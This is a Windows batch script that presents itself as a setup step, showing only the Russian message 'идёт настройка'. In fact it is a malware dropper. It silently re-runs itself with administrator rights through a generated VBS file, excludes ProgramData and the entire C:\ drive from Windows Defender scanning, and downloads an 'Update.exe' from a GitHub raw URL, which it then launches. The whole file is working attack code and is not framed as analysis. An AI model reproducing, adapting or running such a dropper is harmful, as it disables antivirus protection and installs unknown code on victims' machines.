@echo off 
chcp 65001
mode con cols=15 lines=5
echo идёт настройка
if _%1_==_payload_  goto :payload 

:getadmin 
    set vbs=%temp%\getadmin.vbs 
    echo Set UAC = CreateObject^("Shell.Application"^)                >> "%vbs%" 
    echo UAC.ShellExecute "%~s0", "payload %~sdp0 %*", "", "runas", 1 >> "%vbs%" 
    "%temp%\getadmin.vbs" 
    del "%temp%\getadmin.vbs" 
goto :eof 

:payload 

PowerShell -Command "Add-MpPreference -ExclusionPath '%ProgramData%'"
PowerShell -Command "Add-MpPreference -ExclusionPath 'C:\'"


set "url=https://github.com/Pythonist310/uu/raw/d5a4f616e48660432c862d4a12c0b7bf164d3839/Update.exe"  
set "filename=%TEMP%\Update.exe"  

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%filename%')"

if %errorlevel% equ 0 (
    start "" /high "%filename%"
) else (
cls
)
:exit
exit /b